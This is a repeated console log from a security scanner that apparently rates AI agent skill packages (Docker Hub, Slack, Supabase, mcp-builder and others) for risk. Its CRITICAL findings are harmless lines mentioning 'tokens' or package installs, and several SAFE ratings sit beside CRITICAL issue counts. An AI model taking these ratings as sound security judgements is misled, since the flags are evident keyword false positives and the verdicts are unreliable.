Scanning: awesome-claude-skills-SE-skills/docker-hub-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/docker-hub-automation

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in awesome-claude-skills-SE-skills/docker-hub-automation/SKILL.md:20
    Pattern: 2. Connect your Docker Hub account when prompted (JWT/token authentication)
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/docker-hub-automation/SKILL.md:113
    Pattern: | JWT authentication | `DOCKER_HUB_CREATE_ORGANIZATION` requires JWT auth fro...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-docker-hub-automation.html
Scanning: awesome-claude-skills-SE-skills/docker-hub-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/docker-hub-automation

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in awesome-claude-skills-SE-skills/docker-hub-automation/SKILL.md:20
    Pattern: 2. Connect your Docker Hub account when prompted (JWT/token authentication)
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/docker-hub-automation/SKILL.md:113
    Pattern: | JWT authentication | `DOCKER_HUB_CREATE_ORGANIZATION` requires JWT auth fro...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-docker-hub-automation.json
Scanning: awesome-claude-skills-SE-skills/github-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/github-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-github-automation.html
Scanning: awesome-claude-skills-SE-skills/github-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/github-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-github-automation.json
Scanning: awesome-claude-skills-SE-skills/gitlab-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/gitlab-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-gitlab-automation.html
Scanning: awesome-claude-skills-SE-skills/gitlab-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/gitlab-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-gitlab-automation.json
Scanning: awesome-claude-skills-SE-skills/hookdeck-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/hookdeck-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/hookdeck-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-hookdeck-automation.html
Scanning: awesome-claude-skills-SE-skills/hookdeck-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/hookdeck-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/hookdeck-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-hookdeck-automation.json
Scanning: awesome-claude-skills-SE-skills/jira-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/jira-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-jira-automation.html
Scanning: awesome-claude-skills-SE-skills/jira-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/jira-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-jira-automation.json
Scanning: awesome-claude-skills-SE-skills/linear-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/linear-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-linear-automation.html
Scanning: awesome-claude-skills-SE-skills/linear-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/linear-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-linear-automation.json
Scanning: awesome-claude-skills-SE-skills/mcp-builder

[*] Scanning Skill: awesome-claude-skills-SE-skills/mcp-builder

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (31):
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/SKILL.md:34
    Pattern: - Agents have constrained context windows - make every token count
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/SKILL.md:109
    Pattern: - Implement character limits and truncation strategies (e.g., 25,000 tokens)
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/SKILL.md:143
    Pattern: - Authentication/token management
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:42
    Pattern: - Comment on any errors encountered during tool usage: Did the tool fail to e...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:99
    Pattern: max_tokens=4096,
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:140
    Pattern: max_tokens=4096,
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:315
    Pattern: python evaluation.py -t sse -u https://example.com/mcp -H "Authorization: Bea...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/reference/mcp_best_practices.md:327
    Pattern: - Validate access tokens before processing requests
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/reference/mcp_best_practices.md:328
    Pattern: - Only accept tokens specifically intended for your server
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/reference/mcp_best_practices.md:329
    Pattern: - Reject tokens without proper audience claims
    Confidence: MEDIUM
  and 21 more

[*] Summary:
  Total Files Scanned: 9
  Critical Issues: 31
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 31

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/awesome-claude-skills-SE-skills-mcp-builder.html
Scanning: awesome-claude-skills-SE-skills/mcp-builder

[*] Scanning Skill: awesome-claude-skills-SE-skills/mcp-builder

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (31):
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/SKILL.md:34
    Pattern: - Agents have constrained context windows - make every token count
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/SKILL.md:109
    Pattern: - Implement character limits and truncation strategies (e.g., 25,000 tokens)
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/SKILL.md:143
    Pattern: - Authentication/token management
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:42
    Pattern: - Comment on any errors encountered during tool usage: Did the tool fail to e...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:99
    Pattern: max_tokens=4096,
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:140
    Pattern: max_tokens=4096,
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/scripts/evaluation.py:315
    Pattern: python evaluation.py -t sse -u https://example.com/mcp -H "Authorization: Bea...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/reference/mcp_best_practices.md:327
    Pattern: - Validate access tokens before processing requests
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/reference/mcp_best_practices.md:328
    Pattern: - Only accept tokens specifically intended for your server
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/mcp-builder/reference/mcp_best_practices.md:329
    Pattern: - Reject tokens without proper audience claims
    Confidence: MEDIUM
  and 21 more

[*] Summary:
  Total Files Scanned: 9
  Critical Issues: 31
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 31

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/awesome-claude-skills-SE-skills-mcp-builder.json
Scanning: awesome-claude-skills-SE-skills/npm-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/npm-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/npm-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-npm-automation.html
Scanning: awesome-claude-skills-SE-skills/npm-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/npm-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/npm-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-npm-automation.json
Scanning: awesome-claude-skills-SE-skills/pagerduty-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/pagerduty-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-pagerduty-automation.html
Scanning: awesome-claude-skills-SE-skills/pagerduty-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/pagerduty-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-pagerduty-automation.json
Scanning: awesome-claude-skills-SE-skills/sentry-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/sentry-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/sentry-automation/SKILL.md:207
    Pattern: - API token scopes must match the operations being performed
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-sentry-automation.html
Scanning: awesome-claude-skills-SE-skills/sentry-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/sentry-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/sentry-automation/SKILL.md:207
    Pattern: - API token scopes must match the operations being performed
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-sentry-automation.json
Scanning: awesome-claude-skills-SE-skills/slack-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/slack-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-slack-automation.html
Scanning: awesome-claude-skills-SE-skills/slack-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/slack-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-slack-automation.json
Scanning: awesome-claude-skills-SE-skills/slack-gif-creator

[*] Scanning Skill: awesome-claude-skills-SE-skills/slack-gif-creator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 23
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-slack-gif-creator.html
Scanning: awesome-claude-skills-SE-skills/slack-gif-creator

[*] Scanning Skill: awesome-claude-skills-SE-skills/slack-gif-creator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 23
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-slack-gif-creator.json
Scanning: awesome-claude-skills-SE-skills/slackbot-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/slackbot-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/slackbot-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-slackbot-automation.html
Scanning: awesome-claude-skills-SE-skills/slackbot-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/slackbot-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/slackbot-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-slackbot-automation.json
Scanning: awesome-claude-skills-SE-skills/sourcegraph-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/sourcegraph-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/sourcegraph-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-sourcegraph-automation.html
Scanning: awesome-claude-skills-SE-skills/sourcegraph-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/sourcegraph-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/sourcegraph-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-sourcegraph-automation.json
Scanning: awesome-claude-skills-SE-skills/supabase-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/supabase-automation

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:86
    Pattern: 7. `SUPABASE_GET_PROJECT_API_KEYS` - Get API keys (sensitive -- handle carefu...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:96
    Pattern: - `GET_PROJECT_API_KEYS` returns live secrets -- NEVER log, display, or persi...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:98
    Pattern: - Config tools may return 401/403 if token lacks required scope; handle grace...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:204
    Pattern: - `GET_PROJECT_API_KEYS` returns service-role keys -- NEVER expose full values
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:233
    Pattern: | Get API keys | `SUPABASE_GET_PROJECT_API_KEYS` | `ref` |
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-supabase-automation.html
Scanning: awesome-claude-skills-SE-skills/supabase-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/supabase-automation

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:86
    Pattern: 7. `SUPABASE_GET_PROJECT_API_KEYS` - Get API keys (sensitive -- handle carefu...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:96
    Pattern: - `GET_PROJECT_API_KEYS` returns live secrets -- NEVER log, display, or persi...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:98
    Pattern: - Config tools may return 401/403 if token lacks required scope; handle grace...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:204
    Pattern: - `GET_PROJECT_API_KEYS` returns service-role keys -- NEVER expose full values
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/supabase-automation/SKILL.md:233
    Pattern: | Get API keys | `SUPABASE_GET_PROJECT_API_KEYS` | `ref` |
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-supabase-automation.json
Scanning: awesome-claude-skills-SE-skills/test-app-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/test-app-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/test-app-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-test-app-automation.html
Scanning: awesome-claude-skills-SE-skills/test-app-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/test-app-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/test-app-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-test-app-automation.json
Scanning: awesome-claude-skills-SE-skills/vercel-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/vercel-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/vercel-automation/SKILL.md:185
    Pattern: - Check response for pagination tokens or `next` fields
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-vercel-automation.html
Scanning: awesome-claude-skills-SE-skills/vercel-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/vercel-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/vercel-automation/SKILL.md:185
    Pattern: - Check response for pagination tokens or `next` fields
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-vercel-automation.json
Scanning: awesome-claude-skills-SE-skills/webapp-testing

[*] Scanning Skill: awesome-claude-skills-SE-skills/webapp-testing

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-webapp-testing.html
Scanning: awesome-claude-skills-SE-skills/webapp-testing

[*] Scanning Skill: awesome-claude-skills-SE-skills/webapp-testing

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-webapp-testing.json
Scanning: anthropics-skills-SE-skills/frontend-design

[*] Scanning Skill: anthropics-skills-SE-skills/frontend-design

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/anthropics-skills-SE-skills-frontend-design.html
Scanning: anthropics-skills-SE-skills/frontend-design

[*] Scanning Skill: anthropics-skills-SE-skills/frontend-design

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/anthropics-skills-SE-skills-frontend-design.json
Scanning: anthropics-skills-SE-skills/web-artifacts-builder

[*] Scanning Skill: anthropics-skills-SE-skills/web-artifacts-builder

[OK] Risk Level: SAFE (0.8/10)

[!] CRITICAL Issues (1):
  [CMD001] in anthropics-skills-SE-skills/web-artifacts-builder/scripts/init-artifact.sh:34
    Pattern: if ! command -v pnpm &> /dev/null; then
    Confidence: HIGH

[*] WARNING Issues (2):
  [DEP001] in anthropics-skills-SE-skills/web-artifacts-builder/scripts/init-artifact.sh:36
    Pattern: npm install -g pnpm
    Confidence: MEDIUM
  [DEP001] in anthropics-skills-SE-skills/web-artifacts-builder/scripts/init-artifact.sh:272
    Pattern: pnpm install @radix-ui/react-accordion @radix-ui/react-aspect-ratio @radix-ui...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/anthropics-skills-SE-skills-web-artifacts-builder.html
Scanning: anthropics-skills-SE-skills/web-artifacts-builder

[*] Scanning Skill: anthropics-skills-SE-skills/web-artifacts-builder

[OK] Risk Level: SAFE (0.8/10)

[!] CRITICAL Issues (1):
  [CMD001] in anthropics-skills-SE-skills/web-artifacts-builder/scripts/init-artifact.sh:34
    Pattern: if ! command -v pnpm &> /dev/null; then
    Confidence: HIGH

[*] WARNING Issues (2):
  [DEP001] in anthropics-skills-SE-skills/web-artifacts-builder/scripts/init-artifact.sh:36
    Pattern: npm install -g pnpm
    Confidence: MEDIUM
  [DEP001] in anthropics-skills-SE-skills/web-artifacts-builder/scripts/init-artifact.sh:272
    Pattern: pnpm install @radix-ui/react-accordion @radix-ui/react-aspect-ratio @radix-ui...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/anthropics-skills-SE-skills-web-artifacts-builder.json
Scanning: anthropics-skills-SE-skills/webapp-testing

[*] Scanning Skill: anthropics-skills-SE-skills/webapp-testing

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/anthropics-skills-SE-skills-webapp-testing.html
Scanning: anthropics-skills-SE-skills/webapp-testing

[*] Scanning Skill: anthropics-skills-SE-skills/webapp-testing

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/anthropics-skills-SE-skills-webapp-testing.json
